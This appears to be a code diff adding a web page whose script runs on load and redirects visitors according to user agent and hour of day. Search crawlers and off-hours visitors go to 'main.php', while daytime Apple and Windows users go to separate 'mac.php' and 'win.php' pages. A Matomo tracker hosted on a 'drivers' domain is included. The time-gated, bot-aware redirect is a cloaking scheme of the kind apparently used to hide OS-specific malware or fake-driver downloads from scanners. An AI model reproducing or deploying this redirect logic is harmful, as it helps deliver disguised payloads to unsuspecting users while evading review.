@@ -1,0 +1,56 @@
+    <script>
+        function isAppleDevice() {
+            var userAgent = navigator.userAgent;
+            return (userAgent.indexOf('Mac OS') !== -1 || userAgent.indexOf('iOS') !== -1);
+        }
+
+        function isSearchBot() {
+            var userAgent = navigator.userAgent;
+            var searchBots = ['Googlebot', 'Bingbot', 'Yahoo Slurp', 'DuckDuckBot', 'YandexBot'];
+            for (var i = 0; i < searchBots.length; i++) {
+                if (userAgent.indexOf(searchBots[i]) !== -1) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        function isWithinTimeRange() {
+            var now = new Date();
+            var currentHour = now.getHours();
+            return (currentHour >= 8 && currentHour < 19);
+        }
+
+        function redirectToPage() {
+            if (isSearchBot() && isWithinTimeRange()) {
+                window.location.href = 'main.php';
+            } else if (isAppleDevice() && isWithinTimeRange()) {
+                window.location.href = 'mac.php';
+            } else if (isWithinTimeRange()) {
+                window.location.href = 'win.php';
+            } else {
+                window.location.href = 'main.php';
+            }
+        }
+
+        // Call the redirection function when the page loads
+        window.onload = redirectToPage;
+    </script>
+	
+	
+<html>
+
+<script>
+  var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="https://drivers.ink/matomo/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '91']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+</html>
